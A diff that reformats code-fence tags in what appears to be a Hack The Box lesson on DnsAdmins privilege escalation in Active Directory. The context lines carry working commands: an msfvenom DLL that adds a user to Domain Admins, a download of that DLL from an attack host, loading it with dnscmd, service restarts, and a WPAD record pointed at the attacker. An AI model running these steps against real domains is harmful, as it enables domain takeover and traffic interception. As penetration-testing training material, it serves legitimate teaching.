@@ -20,8 +20,7 @@ Let's step through the attack.
 
 We can generate a malicious DLL to add a user to the `domain admins` group using `msfvenom`.
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll
 
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
@@ -36,8 +35,7 @@ Saved as: adduser.dll
 
 Next, start a Python HTTP server.
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ python3 -m http.server 7777
 
 Serving HTTP on 0.0.0.0 port 7777 (http://0.0.0.0:7777/) ...
@@ -48,8 +46,7 @@ Serving HTTP on 0.0.0.0 port 7777 (http://0.0.0.0:7777/) ...
 
 Download the file to the target.
 
-```
-        powershell
+```powershell
 PS C:\htb>  wget "http://10.10.14.3:7777/adduser.dll" -outfile "adduser.dll"
 ```
 
@@ -57,8 +54,7 @@ Let's first see what happens if we use the `dnscmd` utility to load a custom DLL
 
 #### Loading DLL as Non-Privileged User
 
-```
-        cmd
+```bat
 C:\htb> dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll
 
 DNS Server failed to reset registry property.
@@ -70,8 +66,7 @@ As expected, attempting to execute this command as a normal user isn't successfu
 
 #### Loading DLL as Member of DnsAdmins
 
-```
-        powershell
+```powershell
 PS C:\htb> Get-ADGroupMember -Identity DnsAdmins
 
 distinguishedName : CN=netadm,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
@@ -86,8 +81,7 @@ SID               : S-1-5-21-669053619-2741956077-1013132368-1109
 
 After confirming group membership in the `DnsAdmins` group, we can re-run the command to load a custom DLL.
 
-```
-        cmd
+```bat
 C:\htb> dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll
 
 Registry property serverlevelplugindll successfully reset.
@@ -106,8 +100,7 @@ After restarting the DNS service (if our user has this level of access), we shou
 
 First, we need our user's SID.
 
-```
-        cmd
+```bat
 C:\htb> wmic useraccount where name="netadm" get sid
 
 SID
@@ -118,8 +111,7 @@ S-1-5-21-669053619-2741956077-1013132368-1109
 
 Once we have the user's SID, we can use the `sc` command to check permissions on the service. Per this [article](https://www.winhelponline.com/blog/view-edit-service-permissions-windows/), we can see that our user has `RPWP` permissions which translate to `SERVICE_START` and `SERVICE_STOP`, respectively.
 
-```
-        cmd
+```bat
 C:\htb> sc.exe sdshow DNS
 
 D:(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SO)(A;;RPWP;;;S-1-5-21-669053619-2741956077-1013132368-1109)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)
@@ -131,8 +123,7 @@ Check out the `Windows Fundamentals` module for an explanation of SDDL syntax in
 
 After confirming these permissions, we can issue the following commands to stop and start the service.
 
-```
-        cmd
+```bat
 C:\htb> sc stop dns
 
 SERVICE_NAME: dns
@@ -149,8 +140,7 @@ The DNS service will attempt to start and run our custom DLL, but if we check th
 
 #### Starting the DNS Service
 
-```
-        cmd
+```bat
 C:\htb> sc start dns
 
 SERVICE_NAME: dns
@@ -169,8 +159,7 @@ SERVICE_NAME: dns
 
 If all goes to plan, our account will be added to the Domain Admins group or receive a reverse shell if our custom DLL was made to give us a connection back.
 
-```
-        cmd
+```bat
 C:\htb> net group "Domain Admins" /dom
 
 Group name     Domain Admins
@@ -195,8 +184,7 @@ These steps must be taken from an elevated console with a local or domain admin 
 
 The first step is confirming that the `ServerLevelPluginDll` registry key exists. Until our custom DLL is removed, we will not be able to start the DNS service again correctly.
 
-```
-        cmd
+```bat
 C:\htb> reg query \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters
 
 HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\DNS\Parameters
@@ -215,8 +203,7 @@ HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\DNS\Parameters
 
 We can use the `reg delete` command to remove the key that points to our custom DLL.
 
-```
-        cmd
+```bat
 C:\htb> reg delete \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters  /v ServerLevelPluginDll
 
 Delete the registry value ServerLevelPluginDll (Yes/No)? Y
@@ -227,8 +214,7 @@ The operation completed successfully.
 
 Once this is done, we can start up the DNS service again.
 
-```
-        cmd
+```bat
 C:\htb> sc.exe start dns
 
 SERVICE_NAME: dns
@@ -247,8 +233,7 @@ SERVICE_NAME: dns
 
 If everything went to plan, querying the DNS service will show that it is running. We can also confirm that DNS is working correctly within the environment by performing an `nslookup` against the localhost or another host in the domain.
 
-```
-        cmd
+```bat
 C:\htb> sc query dns
 
 SERVICE_NAME: dns
@@ -269,8 +254,7 @@ Once again, this is a potentially destructive attack that we should only carry o
 
 As detailed in this [post](http://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html), we could also utilize [mimilib.dll](https://github.com/gentilkiwi/mimikatz/tree/master/mimilib) from the creator of the `Mimikatz` tool to gain command execution by modifying the [kdns.c](https://github.com/gentilkiwi/mimikatz/blob/master/mimilib/kdns.c) file to execute a reverse shell one-liner or another command of our choosing.
 
-```
-        C
+```c
 /*  Benjamin DELPY `gentilkiwi`
     https://blog.gentilkiwi.com
     benjamin@gentilkiwi.com
@@ -316,8 +300,7 @@ After disabling the global query block list and creating a WPAD record, every ma
 
 To set up this attack, we first disabled the global query block list:
 
-```
-        powershell
+```powershell
 PS C:\htb> Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName dc01.inlanefreight.local
 ```
 
@@ -325,7 +308,6 @@ PS C:\htb> Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName dc01.i
 
 Next, we add a WPAD record pointing to our attack machine.
 
-```
-        powershell
+```powershell
 PS C:\htb> Add-DnsServerResourceRecordA -Name wpad -ZoneName inlanefreight.local -ComputerName dc01.inlanefreight.local -IPv4Address 10.10.14.3
 ```
